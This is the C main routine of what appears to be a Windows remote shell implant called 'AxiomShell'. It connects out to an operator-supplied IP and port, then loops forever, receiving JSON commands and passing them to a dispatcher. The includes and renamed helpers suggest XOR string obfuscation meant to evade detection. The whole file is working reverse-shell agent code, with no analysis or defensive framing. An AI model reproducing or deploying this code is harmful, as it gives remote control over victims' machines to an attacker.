#include <ws2tcpip.h>
#include <stdio.h>

#include "AxiomShell.h"
#include "autoxor.h"
#include "Glibc.h"
#include "Utils.h"
#include "json.h"

int main(int argc, char** argv, const char** env)
{
	WSADATA wsaData;
	SOCKET sock;
	struct sockaddr_in serverAddr;
	int bytesReceived = 0;
	//size_t totalBytesSent = 0;
	char* next_packet;
	PCOMMAND cmd;

	// env is needed by process invoker
	drunk_cacheenv(env);

	// Initialise Winsock
	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0)
	{
		xprintf("[!] WSAStartup(): %d\n", result);
		return (1);
	}

	// Create a socket
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
	{
		xprintf("[!] socket(): %d\n", WSAGetLastError());
		WSACleanup();
		return (1);
	}

	// Specify server address
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(drunk_atoi(argv[2]));
	inet_pton(AF_INET, argv[1], &serverAddr.sin_addr);

	// Connect to the server
	if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
	{
		xprintf("[!] connect(): %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return (1);
	}

	// Send the data
	next_packet = NULL;
	while (1)
	{
		// Notify the client that we are ready to accept a new command
		JSON_send_packets(JsonReadyForInput, sock, NULL);

		// Wait for the client's command
		if (next_packet != NULL)
			free(next_packet);
		next_packet = (char*)NETWORK_get_next_packet(sock, &bytesReceived);
		cmd = JSON_parse_packet(next_packet);

		// Send command to dispatcher
		CORE_handle_command(sock, cmd);
		
		// We are done with this command, discard it
		JSON_free_command(cmd);
	}

	// Close the socket
	closesocket(sock);
	WSACleanup();

	return (0);
}

